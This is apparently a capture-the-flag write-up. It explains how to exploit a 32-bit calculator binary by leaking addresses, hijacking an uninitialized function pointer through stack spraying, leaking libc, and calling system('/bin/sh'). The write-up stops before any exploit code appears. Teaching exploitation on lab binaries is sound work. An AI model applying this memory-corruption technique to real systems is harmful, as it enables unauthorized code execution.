32 bit ELF, with all the protection enabled.

program menu:
```
$ ./rec 
Calculators are fun!
0 - Take note
1 - Read note
2 - Polish
3 - Infix
4 - Reverse Polish
5 - Sign
6 - Exit
> 
```
* Take note: input a note
* Read note: output the note
* Polish: do the `sum` operation or the elementary arithmetic (prefix expression)
* Infix: do the elementary arithmetic (infix expression)
* Reverse Polish: do the elementary arithmetic (postfix expression)
* Sign: input a number and see if it is a positive/negative number

First we found that the `Read note` function doesn't work well:
```
$ ./rec 
Calculators are fun!
0 - Take note
1 - Read note
2 - Polish
3 - Infix
4 - Reverse Polish
5 - Sign
6 - Exit
> 0
Your note: 123
0 - Take note
1 - Read note
2 - Polish
3 - Infix
4 - Reverse Polish
5 - Sign
6 - Exit
> 1
Your note:�VXV`�s��`XV     <-- WTF?
```

This is because the program use a stack address as the `note`'s buffer. After we take a note and leave the function, the buffer will be filled with some (useful) addresses (due to the function epilogue). And because of this, we're able to leak the stack address & text's base address.

Now it's time to try controlling the EIP. There's a program logic vulnerability in the `sign` function:
```c 
  if ( num <= 0 )
  {
    if ( num < 0 )
      v1 = (void (*)(void))puts_negative;
  }
  else
  {
    v1 = (void (*)(void))puts_positive;
  }
  v1();
```
It handles both positive & negative numbers. **But what about `0`** ?
```
$ ./rec 
Calculators are fun!
0 - Take note
1 - Read note
2 - Polish
3 - Infix
4 - Reverse Polish
5 - Sign
6 - Exit
> 5
0
[1]    40091 segmentation fault (core dumped)  ./rec
```
The reason why the program crash is because the program did not assigned a value to `v1` (since it did not handle `0`), so when it ran to line `v1()`, it will set the EIP to `0x0` and crash the program. Let's check the assembly code:
```
0x56555d3b:  mov    eax,DWORD PTR [ebp-0x20]   <-- &v1 = ebp-0x20
0x56555d3e:  call   eax
```
It shows that if we can control the value of `[ebp-0x20]`, we'll be able to control the EIP and hijack the program control flow.

I found that the stack frame of the `sign` function is "higher" (or "lesser") than the other functions. If we can't "reach that high" in other functions, we won't be able to control the function pointer. 

After done some fuzzing, I finally found that in the `Polish` function, if we do the `sum` operation and keep entering number, the program will keep pushing number to the stack, making us able to "reach the height" and control the function pointer (and the parameters !) in the `sign` function.

So here's how we gonna exploit the service:
1. Take a note & Read the note, leak the text's base address
2. Use `Polish`'s `sum` operation to control the function pointer & the function parameter. We first set the function pointer to `puts` and the parameter to `__libc_start_main@got` (there's no `.got.plt` due to the **FULL RELRO** protection)
3. Goto `sign` function and input `0`, it will call `puts(__libc_start_main@got)` and gave us the libc's base address
4. Repeat step 2, this time we set the function pointer to `system` and the parameter to "pointer to /bin/sh"
5. Goto `sign` function and input `0`, call `system("/bin/sh")` and get the shell

Here's the exploit. The libc's information are provided by [libc-database](https://github.com/niklasb/libc-database)
